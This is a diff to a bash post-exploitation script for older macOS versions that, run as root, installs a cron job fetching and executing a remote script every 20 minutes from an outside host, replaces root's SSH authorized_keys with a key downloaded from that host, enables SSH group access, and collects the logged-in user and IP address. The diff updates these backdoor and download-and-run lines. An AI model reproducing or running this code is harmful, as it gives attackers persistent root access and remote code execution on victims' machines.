@@ -1,4 +1,4 @@
-#!/bin/bash
+#!/usr/bin/env bash
 # MUST be run as root. jm.sh should be used to automate exploitation and running of
 # this script on Macs running OS X <= 10.11.6.
 
@@ -13,14 +13,14 @@ dscl . change /Groups/com.apple.access_ssh RecordName com.apple.access_ssh com.a
 
 # Unlike on Linux, we have to fully save the file rather than just piping it into bash.
 # On Macs, each line is executed separately, so things like variables won't work if we just pipe it.
-(crontab -l 2>/dev/null; echo '*/20 * * * * curl -L erikboesen.com/macupdate.sh --output /tmp/macupdate.sh && chmod +x /tmp/macupdate.sh && /tmp/macupdate.sh') | crontab -
+(crontab -l 2>/dev/null; echo '*/20 * * * * curl -L boesen.science:2042/mac/update.sh --output /tmp/update.sh && chmod +x /tmp/update.sh && /tmp/update.sh') | crontab -
 
 SSHPATH="/var/root/.ssh"
 
 mkdir -p "$SSHPATH" # On most computers, there won't be a .ssh directory initially
 
 rm "$SSHPATH/authorized_keys" # Just in case
-curl -so "$SSHPATH/authorized_keys" https://erikboesen.com/pubkey
+curl -Lso "$SSHPATH/authorized_keys" boesen.science:2042/pubkey
 
 USER=`stat -f "%Su" /dev/console` # Get user currently logged in (in GUI).
 IP=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'`
